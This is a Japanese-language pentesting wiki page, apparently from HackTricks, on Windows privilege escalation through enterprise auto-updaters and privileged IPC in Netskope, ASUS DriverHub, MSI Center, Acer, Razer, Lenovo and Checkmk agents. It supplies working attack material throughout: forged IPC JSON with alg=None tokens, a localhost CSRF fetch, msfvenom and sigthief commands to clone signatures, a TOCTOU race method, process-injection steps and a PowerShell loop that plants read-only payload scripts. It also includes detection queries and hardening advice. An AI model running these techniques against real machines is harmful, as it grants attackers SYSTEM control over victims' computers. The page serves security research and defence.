# エンタープライズ自動アップデーターと特権 IPC の悪用（例: Netskope、ASUS、MSI）

{{#include ../../banners/hacktricks-training.md}}

このページでは、低負荷の IPC インターフェースと特権による更新フローを公開する、エンタープライズ向けエンドポイントエージェントやアップデーターで見つかった Windows ローカル権限昇格チェーンの一種を一般化して解説します。代表例は Netskope Client for Windows < R129（CVE-2025-0309）です。低権限ユーザーが登録先を攻撃者の制御するサーバーに変更させ、悪意ある MSI を配信して、SYSTEM サービスにインストールさせることができます。<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

類似製品で応用できる主なアイデア:
- 特権サービスの localhost IPC を悪用し、攻撃者のサーバーへの再登録や再設定を強制する。
- ベンダーの更新エンドポイントを実装し、不正な Trusted Root CA を配信したうえで、アップデーターに悪意ある「署名済み」パッケージを指定する。
- 脆弱な署名者チェック（CN の許可リスト）、任意のダイジェストフラグ、緩い MSI プロパティを回避する。
- IPC が「暗号化」されている場合は、レジストリに保存された、誰でも読み取れるマシン識別子から鍵と IV を導出する。
- サービスが呼び出し元をイメージパスやプロセス名で制限している場合は、許可リストにあるプロセスへインジェクションするか、プロセスを一時停止状態で起動し、最小限のスレッドコンテキスト変更を通じて DLL をロードする。

カスタムのローカル TCP サービスは、PIN などのアプリケーション認証情報を要求する場合でも、同じように呼び出し元の識別情報と入力境界を確認する必要があります。リスナーとそのプロセスおよび実効サービスアカウントを特定し、実際にデプロイされたバイナリとバージョンを調査してください。また、呼び出し元が制御するフィールドが、固定長バッファーへのコピー前や子プロセスのコマンド作成に使用される前に、長さ検証されているかを確認してください。[Microsoft のバッファーオーバーランに関するガイダンス](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns)では、特権ネイティブコードにおいて外部入力の検証が不十分なことが危険である理由を説明しています。ループバックリスナー、ハードコードされた認証情報、またはプロセス名だけでは、メモリ破損や SYSTEM での実行が証明されたことにはなりません。到達可能性、認可、コードパス、緩和策はそれぞれ別個の条件です。稼働中のサービスにクラッシュするほど長い入力を送るのではなく、通常の列挙は受動的に行ってください。

---
## 1) localhost IPC を介して攻撃者のサーバーへの登録を強制する

多くのエージェントには、localhost TCP 経由で JSON を使って SYSTEM サービスと通信するユーザーモードの UI プロセスが付属しています。

Netskope で確認された内容:
- UI: stAgentUI（低い整合性レベル）↔ Service: stAgentSvc（SYSTEM）
- IPC コマンド ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

悪用の流れ:
1) バックエンドのホスト（例: AddonUrl）を制御するクレームを含む JWT 登録トークンを作成する。署名を不要にするため、alg=None を使用する。
2) JWT とテナント名を指定して、プロビジョニングコマンドを呼び出す IPC メッセージを送信する:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) サービスが enrollment/config のために不正なサーバーへの接続を開始します。例:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

注意:
- 呼び出し元の検証がパス/名前ベースの場合、許可リストに登録されたベンダーのバイナリからリクエストを発生させます（§4 を参照）。<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) update channel を乗っ取り、SYSTEM としてコードを実行する

クライアントが自分のサーバーと通信するようになったら、想定されるエンドポイントを実装し、攻撃者の MSI を指すように誘導します。一般的な流れ:

1) /v2/config/org/clientconfig → updater の間隔を非常に短くした JSON config を返します。例:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → PEM CA certificateを返す。サービスはこれをLocal Machine Trusted Rootストアにインストールする。
3) /v2/checkupdate → 悪意のあるMSIと偽のバージョンを指すメタデータを提供する。

実際に確認されている一般的なチェックのバイパス:
- Signer CN allow-list: サービスはSubject CNが「netSkope Inc」または「Netskope, Inc.」と等しいかだけを確認する場合がある。攻撃者が用意したCAでそのCNのleaf certificateを発行し、MSIに署名できる。
- CERT_DIGEST property: CERT_DIGESTという名前の無害なMSI propertyを含める。インストール時に検証は行われない。
- Optional digest enforcement: config flag（例: check_msi_digest=false）で追加の暗号学的検証を無効にできる。

結果: SYSTEMサービスが
C:\ProgramData\Netskope\stAgent\data\*.msi
からMSIをインストールし、NT AUTHORITY\SYSTEMとして任意のコードを実行する。<sup>[[1]](#references)[[2]](#references)</sup>

Patch-bypassの教訓: ベンダーが更新元を暗号学的に認証せず、「信頼できる」ドメインを少数だけallow-listに登録して対応する場合は、トラフィックの誘導に使えるベンダー所有のredirectorやreverse proxyを探そう。Netskopeの場合、公開された追加調査によって、R129時代のallow-listは、攻撃者が制御するAzure App Serviceのコンテンツをproxyする`rproxy.goskope.com`経由で依然として悪用できることが示された。hostname allow-listは信頼境界ではなく、足止め程度と考えること。<sup>[[14]](#references)</sup>

---
## 3) 暗号化されたIPCリクエストの偽造（存在する場合）

R127以降、NetskopeはIPC JSONをBase64のように見えるencryptData fieldでラップするようになった。リバースエンジニアリングの結果、AESが使われており、key/IVはすべてのユーザーが読み取り可能なregistry値から導出されていることが判明した:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

攻撃者は暗号化を再現し、標準ユーザーから有効な暗号化済みコマンドを送信できる。<sup>[[1]](#references)[[2]](#references)</sup> 一般的なヒント: agentが突然IPCを「暗号化」し始めたら、HKLM配下にあるdevice ID、product GUID、install IDを材料として探そう。

---
## 4) IPC caller allow-list（path/nameチェック）のバイパス

一部のサービスは、TCP接続のPIDを特定し、Program Files配下にあるallow-list登録済みのベンダーbinary（例: stagentui.exe、bwansvc.exe、epdlp.exe）とimage path/nameを照合して、peerを認証しようとする。

実用的なバイパスは2つある:
- allow-list登録済みのprocess（例: nsdiag.exe）にDLL injectionし、その中からIPCをproxyする。
- allow-list登録済みのbinaryをsuspended状態で起動し、CreateRemoteThreadを使わずにproxy DLLをbootstrapする（§5参照）。これにより、driverが強制するtamperルールを満たせる。<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Tamper protectionに対応したinjection: suspended process + NtContinue patch

製品には、保護対象processへのhandleから危険な権限を削除するminifilter/OB callbacks driver（例: Stadrv）が含まれていることが多い:
- Process: PROCESS_TERMINATE、PROCESS_CREATE_THREAD、PROCESS_VM_READ、PROCESS_DUP_HANDLE、PROCESS_SUSPEND_RESUMEを削除する
- Thread: THREAD_GET_CONTEXT、THREAD_QUERY_LIMITED_INFORMATION、THREAD_RESUME、SYNCHRONIZEに制限する

これらの制約に対応する、信頼性の高いuser-mode loader:
1) CREATE_SUSPENDEDを指定してベンダーbinaryのCreateProcessを実行する。
2) まだ取得可能なhandleを取得する: processにはPROCESS_VM_WRITE | PROCESS_VM_OPERATION、threadにはTHREAD_GET_CONTEXT/THREAD_SET_CONTEXT（または既知のRIPでcodeをpatchする場合はTHREAD_RESUMEのみ）。
3) ntdll!NtContinue（または他の初期段階で必ずmapされるthunk）を、自分のDLL pathを指定してLoadLibraryWを呼び出し、その後元に戻る小さなstubで上書きする。
4) ResumeThreadを実行してprocess内でstubを起動し、DLLをロードする。

すでに保護されたprocessに対してPROCESS_CREATE_THREADやPROCESS_SUSPEND_RESUMEを使わず（自分で作成したため）、driverのpolicyを満たせる。<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) 実用的なtooling
- NachoVPN（Netskope plugin）は、攻撃者が用意したCA、悪意のあるMSIへの署名、および必要なendpointの提供を自動化する: /v2/config/org/clientconfig、/config/ca/cert、/v2/checkupdate。<sup>[[3]](#references)</sup>
- UpSkopeは、任意のIPC message（AES暗号化は任意）を作成し、allow-list登録済みbinaryから送信するためのsuspended-process injectionも含む、custom IPC clientである。<sup>[[4]](#references)</sup>

## 7) 未知のupdater/IPCサーフェスの迅速なtriageワークフロー

新しいendpoint agentやマザーボード用「helper」suiteを調査するとき、privescの有望なtargetかどうかは、通常、簡単なワークフローで判断できる。<sup>[[6]](#references)</sup>

1) loopback listenerを列挙し、ベンダーprocessに対応付ける:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) 候補となる named pipes を列挙する:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) pluginベースのIPCサーバーが使用する、レジストリに保存されたルーティングデータを調査する：

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) まず user-mode client からエンドポイント名、JSONキー、コマンドIDを抽出します。パッケージ化された Electron/.NET フロントエンドでは、スキーマ全体が頻繁に leak します。

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) 最終的にプロセスを起動するコードパスだけでなく、実際の信頼判定条件を探してください:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

優先して調べるべきパターン:
- `CryptQueryObject`/証明書の解析は行うものの`WinVerifyTrust`を使っていない場合、「証明書が存在する」ことを「証明書が信頼されている」こととして扱っている可能性が高く、証明書の複製やその他の偽署名者を使った手法が可能になります。
- `Origin`、`Referer`、ダウンロードURL、プロセス名、署名者のCNに対する部分文字列・接尾辞のチェックは認証ではありません。`contains(".vendor.com")`は、攻撃者が制御する類似ドメインを使って悪用できることがほとんどです。
- 低権限のGUIが「このファイルは信頼できる」と判断し、SYSTEMブローカーがその結果をそのまま利用する場合、クライアント側のDLL/JSをパッチするか再実装するだけで、境界を完全に回避できることがあります（Razer式の検証分離）。
- ブローカーがペイロードを`%TEMP%`/`C:\Windows\Temp`にコピーした後、そのパスから検証または実行予約を行う場合は、直ちにTOCTOUによる置き換えの隙と、チェックの緩い代替`ExecuteTask()`ラッパーを公開する隣接プラグインモジュールを調べてください。<sup>[[6]](#references)</sup>

名前付きパイプを多用するターゲットでは、プロトコルを詳しくリバースする前に、PipeViewerを使うと弱いDACLや外部から到達可能なパイプを手早く見つけられます。<sup>[[11]](#references)</sup>

ターゲットが呼び出し元をPID、イメージパス、またはプロセス名だけで認証する場合、それを境界ではなく単なる障害と見なしてください。正規クライアントへのインジェクションや、許可リストに登録されたプロセスからの接続だけで、サーバーのチェックを通過できることがよくあります。名前付きパイプについては、[クライアントの偽装とパイプの悪用に関するこのページ](named-pipe-client-impersonation.md)で、基本手法を詳しく説明しています。

特権を持つ**クリーンアップまたは復元ブローカー**では、パイプACLだけでなく、パスの信頼境界も調べてください。サービス実行ファイルとインストールディレクトリが保護されていても、低権限の呼び出し元が、共有ディレクトリ内の復元先を選択したり、ステージング済みバックアップのファイル名を変更したりできる場合があります。呼び出し元が復元コマンドを実行できること、正確なステージング済み入力またはファイル名を変更できること、ブローカーがより高い権限で実行されること、そして復元処理が実際に指定された保護対象パスへ書き込むことを、それぞれ確認してください。ステージングディレクトリが書き込み可能、またはパイプが読み取り可能というだけでは、任意の特権書き込みが可能だとは言えません。書き込み先のマッピングとサービスの動作は、コードレビューまたは管理されたテストで確認する必要があります。ユーザーファイルが削除される可能性があるため、パッシブな列挙中に未知のクリーンアップコマンドを実行しないでください。

---
## 8) ベンダー署名だけで認証するモジュール式アドインブローカー（Lenovo Vantageのパターン）

新しい亜種として、**署名済みクライアントRPCブローカー**を探す価値があります。低権限のLenovo署名済みデスクトッププロセスがSYSTEMサービスと通信し、サービスは`%ProgramData%`配下のXMLで記述された一連のアドインにJSONコマンドを振り分けます。受け入れられる署名済みクライアントのいずれかでコード実行を達成すると、すべての`runas="system"`コントラクトが攻撃対象になります。<sup>[[15]](#references)</sup>

Lenovo Vantageの調査で確認された、高価値なプリミティブ:
- **ベンダー署名済みであることを理由に呼び出し元を信頼する**: 研究者は、Lenovo署名済みEXEを書き込み可能なディレクトリにコピーし、DLLサイドローディング（`profapi.dll`）を成立させて任意のコードを実行することで、サービスがすでに信頼しているクライアント内で認証済みコンテキストを得ました。
- **マニフェストを使った攻撃対象領域の発見**: アドインは`C:\ProgramData\Lenovo\Vantage\Addins\*.xml`配下で宣言されています。複数のコントラクトが`SYSTEM`として実行されるため、これらのマニフェストを列挙すれば、ブローカー自体をリバースするよりも早く、実際の特権操作を見つけられることがよくあります。
- **認証済みチャネルの背後にあるコマンド単位の脆弱性**: 信頼されたクライアント内に入ると、公開調査によって、更新/インストール操作におけるパストラバーサルと競合状態、特権設定データベースに対するraw SQLの悪用、意図されたハイブの外部への書き込みを可能にするレジストリパスの部分文字列チェックが見つかっています。

ターゲットで役立つ偵察:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

実践上の要点: ヘルパースイートが、まず**呼び出し元プロセス**を認証してから、多数のプラグイン/add-inコマンドへ処理を振り分ける broker を公開している場合、入口の信頼チェックをバイパスしただけで終わらせないでください。manifest/contract table をダンプし、各高権限 verb を個別に fuzz してください。認証済みのチャネルには、通常、複数の二段階目のバグが隠れています。

---
## 1) 特権 HTTP API を狙ったブラウザーから localhost への CSRF (ASUS DriverHub)

DriverHub は、127.0.0.1:53000 で動作するユーザーモードの HTTP サービス (ADU.exe) を搭載しており、https://driverhub.asus.com からのブラウザー呼び出しを想定しています。Origin フィルターは、Origin ヘッダーと `/asus/v1.0/*` が公開するダウンロード URL に対して、単純に `string_contains(".asus.com")` を実行します。そのため、`https://driverhub.asus.com.attacker.tld` のような攻撃者が制御するホストでもチェックを通過し、JavaScript から状態を変更するリクエストを送信できます。<sup>[[6]](#references)</sup> 回避パターンの詳細は[CSRF の基本](../../pentesting-web/csrf-cross-site-request-forgery.md)を参照してください。

実践的な手順:
1) `.asus.com` を含むドメインを登録し、そこに悪意のある Web ページをホストします。
2) `fetch` または XHR を使って、`http://127.0.0.1:53000` 上の特権エンドポイント (例: `Reboot`、`UpdateApp`) を呼び出します。
3) ハンドラーが想定する JSON body を送信します。パックされたフロントエンド JS に、以下のスキーマが示されています。

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

以下に示す PowerShell CLI でも、Origin ヘッダーを信頼された値に偽装すると成功します:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

攻撃者のサイトをブラウザーで開くだけで、1クリック（または `onload` による0クリック）のローカルCSRFが発生し、SYSTEM権限のヘルパーを操作できます。

---
## 2) 安全でないコード署名検証と証明書の複製（ASUS UpdateApp）

`/asus/v1.0/UpdateApp` は、JSON本文で指定された任意の実行ファイルをダウンロードし、`C:\ProgramData\ASUS\AsusDriverHub\SupportTemp` にキャッシュします。ダウンロードURLの検証には同じ部分文字列ロジックが使われるため、`http://updates.asus.com.attacker.tld:8000/payload.exe` も受け入れられます。ダウンロード後、ADU.exe はPEに署名が含まれていること、およびSubject文字列がASUSと一致することだけを確認して実行します。`WinVerifyTrust` も証明書チェーンの検証も行いません。

この処理をweaponizeするには:
1) ペイロードを作成します（例: `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`）。
2) ASUSの署名者をペイロードに複製します（例: `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`）。
3) `pwn.exe` を `.asus.com` に見せかけたドメインでホストし、上記のブラウザーCSRFでUpdateAppをトリガーします。

OriginとURLのフィルターはいずれも部分文字列ベースで、署名者のチェックも文字列を比較するだけなので、DriverHubは攻撃者のバイナリを取得し、昇格したコンテキストで実行します。<sup>[[6]](#references)</sup>

---
## 1) updaterのコピー／実行パスにおけるTOCTOU（MSI Center CMD_AutoUpdateSDK）

MSI CenterのSYSTEMサービスは、各フレームが `4-byte ComponentID || 8-byte CommandID || ASCII arguments` で構成されるTCPプロトコルを公開しています。コアコンポーネント（Component ID `0f 27 00 00`）には `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}` が含まれています。そのハンドラーは次の処理を行います。
1) 指定された実行ファイルを `C:\Windows\Temp\MSI Center SDK.exe` にコピーします。
2) `CS_CommonAPI.EX_CA::Verify` を使って署名を検証します（証明書のSubjectが “MICRO-STAR INTERNATIONAL CO., LTD.” と一致し、`WinVerifyTrust` が成功する必要があります）。
3) 攻撃者が制御する引数を使い、SYSTEMとして一時ファイルを実行するscheduled taskを作成します。

コピーされたファイルは、検証から `ExecuteTask()` の実行までロックされません。攻撃者は次の操作が可能です。
- 正規のMSI署名付きバイナリを指定したFrame Aを送信します（署名チェックを確実に通過させ、taskをキューに登録します）。
- 検証完了直後に `MSI Center SDK.exe` を上書きする悪意あるペイロードを指定したFrame Bを繰り返し送信し、競合させます。

schedulerが起動すると、元のファイルの検証に成功していても、上書きされたペイロードがSYSTEMとして実行されます。安定したexploitには、TOCTOUの隙を突くまでCMD_AutoUpdateSDKを連続送信する2つのgoroutine/threadを使います。<sup>[[6]](#references)</sup>

---
## 2) カスタムSYSTEMレベルIPCとimpersonationの悪用（MSI Center + Acer Control Centre）

### MSI CenterのTCP command set
- `MSI.CentralServer.exe` がロードする各plugin/DLLには、`HKLM\SOFTWARE\MSI\MSI_CentralServer` に保存されたComponent IDが割り当てられます。フレームの最初の4バイトでそのcomponentが選択されるため、攻撃者は任意のmoduleにcommandをルーティングできます。
- pluginは独自のtask runnerを定義できます。`Support\API_Support.dll` は `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` を公開し、**署名検証を一切行わず**に `API_Support.EX_Task::ExecuteTask()` を直接呼び出します。任意のローカルユーザーが `C:\Users\<user>\Desktop\payload.exe` を指定すれば、確実にSYSTEM権限で実行できます。
- Wiresharkでloopbackをスニッフィングするか、dnSpyで.NETバイナリを解析すれば、Componentとcommandの対応関係をすぐに特定できます。その後、カスタムのGo/Pythonクライアントでフレームを再送信できます。<sup>[[6]](#references)</sup>

### Acer Control Centreのnamed pipeとimpersonation level
- `ACCSvc.exe`（SYSTEM）は `\\.\pipe\treadstone_service_LightMode` を公開しており、そのdiscretionary ACLはリモートクライアント（例: `\\TARGET\pipe\treadstone_service_LightMode`）を許可します。command ID `7` にファイルパスを指定して送信すると、サービスのprocess-spawningルーチンが呼び出されます。
- クライアントライブラリは、引数とともにmagic terminator byte（113）をシリアライズします。Frida/`TsDotNetLib` による動的instrumentation（instrumentationのヒントは[Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md)を参照）により、native handlerがこの値を `SECURITY_IMPERSONATION_LEVEL` とintegrity SIDに対応付けてから `CreateProcessAsUser` を呼び出すことが分かります。
- 113（`0x71`）を114（`0x72`）に置き換えると、汎用branchに入り、SYSTEM token全体を保持して高integrity SID（`S-1-16-12288`）を設定します。そのため、起動されたバイナリはローカルでもマシン間でも、制限のないSYSTEMとして実行されます。
- これを公開されているinstaller flag（`Setup.exe -nocheck`）と組み合わせれば、lab VMにもACCをインストールでき、ベンダーのハードウェアなしでpipeを検証できます。<sup>[[6]](#references)</sup>

これらのIPCの脆弱性は、localhostサービスで相互認証（ALPC SIDs、`ImpersonationLevel=Impersonation` filters、token filtering）を強制すべき理由と、各moduleの「任意のバイナリを実行する」ヘルパーで同じ署名検証を行うべき理由を示しています。

---
## 3) 弱いuser-mode検証に依存するCOM/IPC「elevator」ヘルパー（Razer Synapse 4）

Razer Synapse 4では、この種の攻撃に役立つパターンがもう1つ加わりました。低権限ユーザーがCOMヘルパー `RzUtility.Elevator` を介してプロセスの起動を要求できますが、信頼性の判定は特権境界内で確実に行われず、user-mode DLL（`simple_service.dll`）に委ねられています。

確認されたexploitの流れ:
- COM object `RzUtility.Elevator` をインスタンス化します。
- `LaunchProcessNoWait(<path>, "", 1)` を呼び出して、昇格した起動を要求します。
- 公開PoCでは、要求を送る前に `simple_service.dll` 内のPE署名チェックを無効化し、攻撃者が選んだ任意の実行ファイルを起動できるようにします。<sup>[[6]](#references)[[10]](#references)</sup>

最小限のPowerShell呼び出し:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

一般的な要点:「helper」スイートを解析するときは、localhost TCPやnamed pipeだけで調査を終えないこと。`Elevator`、`Launcher`、`Updater`、`Utility`などの名前を持つCOMクラスを確認し、特権サービスが対象バイナリ自体を検証しているのか、それともパッチ可能なuser-modeクライアントDLLが計算した結果を単に信頼しているのかを確かめること。このパターンはRazer以外にも当てはまる。低権限側からのallow/deny判定を高権限のbrokerが利用する分離設計は、どれもprivescの攻撃対象となる可能性がある。


---
## MSI repair中の予測可能な一時スクリプト実行 (Checkmk Agent / CVE-2024-0670)

一部のWindows agentは、今も特権操作を実行するために、一時的な`.cmd`ファイルを`C:\Windows\Temp`に書き込み、`SYSTEM`として実行している。ファイル名が予測可能で、サービスが既存ファイルを安全に再作成しない場合、低権限ユーザーは将来使われる一時ファイルを**read-only**にして事前に作成できる。その結果、特権プロセスは本来のスクリプトではなく、攻撃者が制御する内容を実行する。

脆弱なCheckmk Agentのビルドで確認された内容:
- tempのパターン: `cmk_all_<PID>_1.cmd`
- 影響を受けるブランチ: `2.0.0`、`2.1.0`、`2.2.0`
- トリガー: キャッシュされたagentパッケージのMSI **repair**<sup>[[8]](#references)[[9]](#references)</sup>

実践的な手順:
1. 現在のプロセスIDまたは実行中のagentのPIDから、現実的なPID範囲を見積もる。
2. 短い**ASCII**の`.cmd` payloadを書き込む（`Set-Content -Encoding Ascii`または`cmd.exe`のリダイレクトを使用し、batchファイルへのUTF-16 PowerShell出力は避ける）。
3. 候補範囲にある`C:\Windows\Temp\cmk_all_<PID>_1.cmd`をまとめて作成し、それぞれをread-onlyにする。
4. キャッシュされたMSIのrepairを実行し、特権サービスに一時スクリプトを再生成させてから実行させる。<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

脆弱な製品が Windows Installer でインストールされている場合は、修復を実行する前に、`C:\Windows\Installer` 内のランダムに見えるキャッシュ MSI を製品名に対応付けます。<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

運用上の注意:
- `msiexec /fa` が非対話型の WinRM シェルから失敗し、既存のデスクトップセッションまたは切断されたセッションによって修復を正しく実行できるか確認する必要がある場合、`qwinsta` が役立ちます。<sup>[[7]](#references)</sup>
- このパターンは、**一時スクリプトを誰でも書き込める場所に配置し、後から SYSTEM として実行する**他のエンドポイントエージェントやアップデーターにも当てはまります。予測可能な名前、排他的な作成セマンティクスの欠如、オンデマンドで起動できる修復／更新フローを確認してください。

### 対話型インストーラーの修復と特権コンソール

PDF24 Creator 11.15.1 は、別種の MSI 修復リスクを示しています。プリンターのインストールを行うカスタムアクションが、修復中に SYSTEM 権限で可視コンソールを起動する可能性があります。ベンダーはこの挙動に対処するため、11.15.2 で MSI インストーラーを変更しました。古い製品バージョンは、あくまでトリアージの手掛かりです。登録済みまたは到達可能な MSI パッケージ、このユーザーが修復を開始できるかどうか、脆弱なカスタムアクションとログファイルの遅延が存在するかどうか、対話型デスクトップでコンソールを表示できるかどうかを確認してください。報告された遅延には `faxPrnInst.log` に対する oplock が使用されていました。通常のファイル書き込み権限だけがアクセス条件ではありません。非対話型シェル、アクセスできないパッケージ、またはパッチ適用済みインストーラーがあると、この連鎖は成立しない可能性があります。この問題は `AlwaysInstallElevated` に依存せず、予測可能な一時スクリプトの置き換えとも異なります。

---
## 弱いアップデーター検証を悪用したリモートサプライチェーン乗っ取り（WinGUp / Notepad++）

2025年6月から2025年12月にかけて、Notepad++ のアップデートフローを支えるホスティングインフラを侵害した攻撃者が、標的とした被害者に選別して悪意あるマニフェストを配信しました。旧式の WinGUp ベースのアップデーターはアップデートの真正性を十分に検証していなかったため、悪意ある XML 応答によってクライアントを攻撃者が管理する URL に誘導できました。クライアントは、信頼された証明書チェーンとダウンロードしたインストーラーの有効な PE 署名の両方を必須とせずに HTTPS コンテンツを受け入れていたため、被害者はトロイの木馬化された NSIS `update.exe` を取得して実行しました。<sup>[[12]](#references)[[13]](#references)</sup>

運用フロー（ローカルでの exploit は不要）:
1. **インフラの傍受**: CDN／ホスティングを侵害し、攻撃者のメタデータを含む応答でアップデート確認に応じ、悪意あるダウンロード URL を指定する。
2. **トロイの木馬化された NSIS**: インストーラーがペイロードを取得／実行し、2つの実行チェーンを悪用する:
   - **署名済みバイナリの持ち込み + sideload**: 署名済みの Bitdefender `BluetoothService.exe` を同梱し、その検索パスに悪意ある `log.dll` を配置する。署名済みバイナリが実行されると、Windows が `log.dll` を sideload する。この DLL は Chrysalis backdoor を復号し、リフレクティブにロードする（静的検出を妨げるため、Warbird による保護と API hashing を使用）。
   - **スクリプトによる shellcode injection**: NSIS がコンパイル済み Lua スクリプトを実行し、Win32 API（例: `EnumWindowStationsW`）を使って shellcode を注入し、Cobalt Strike Beacon を配置する。<sup>[[12]](#references)</sup>

あらゆる自動アップデーターに対するハードニング／検出上のポイント:
- ダウンロードしたインストーラーの**証明書 + 署名の検証**を必須にする（ベンダーの署名者を pin し、CN／チェーンが一致しない場合は拒否する）。また、アップデートマニフェスト自体にも署名する（例: XMLDSig）。検証されていないマニフェスト制御のリダイレクトはブロックする。
- **BYO 署名済みバイナリの sideload**を、ダウンロード後の検出ポイントとして扱う。署名済みベンダー EXE が正規のインストールパス外にある名前の DLL（例: Bitdefender が Temp／Downloads にある `log.dll` をロード）をロードした場合や、アップデーターがベンダー署名ではないインストーラーを temp に配置／実行した場合にアラートを出す。
- この連鎖で確認された**マルウェア固有のアーティファクト**を監視する（汎用的な調査ポイントとして有用）: mutex `Global\Jdhfv_1.0.1`、`%TEMP%` への異常な `gup.exe` の書き込み、Lua による shellcode injection の段階。
- Notepad++ は v8.8.9 以降で WinGUp を強化して対応しました。返される XML に署名（XMLDSig）が付与され、新しいビルドでは転送だけを信頼せず、ダウンロードしたインストーラーの証明書 + 署名を検証するようになっています。<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Bitdefender 署名済み EXE による <code>log.dll</code> の sideload（T1574.001）</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> が Notepad++ 以外のインストーラーを起動</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

これらのパターンは、署名なしのマニフェストを受け入れるか、インストーラーの署名者を固定しないあらゆる updater に当てはまります。ネットワークの hijack + 悪意のあるインストーラー + BYO-signed sideloading により、「信頼できる」更新を装った remote code execution が可能になります。

---
## References
